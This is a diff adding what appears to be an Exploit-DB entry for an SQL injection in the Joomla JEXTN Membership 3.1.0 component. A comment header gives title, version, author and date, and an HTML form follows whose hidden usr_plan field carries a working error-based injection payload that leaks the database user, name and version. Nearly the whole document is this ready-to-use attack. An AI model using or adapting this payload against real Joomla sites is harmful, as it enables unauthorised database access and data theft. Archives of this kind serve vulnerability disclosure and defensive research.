@@ -1,0 +1,32 @@
+<!--
+# # # # #
+# Exploit Title: Joomla! Component JEXTN Membership 3.1.0 - SQL Injection
+# Dork: N/A
+# Date: 01.02.2018
+# Vendor Homepage: http://www.jextn.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/e-commerce/membership-a-subscriptions/jextn-membership/
+# Version: 3.1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)	
+# # # # #
+-->
+<html>
+<body>
+<form action="http://localhost/index.php?option=com_jemembership&view=myplans&task=myplans.usersubscriptions" method="post">
+<input name="usr_plan" value="(SELECT 66 FROM(SELECT COUNT(*),CONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELECT (ELT(1=1,1))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)" type="hidden">
+<input type="submit" value="Ver Ayari">
+</form>
+</body>
+</html>
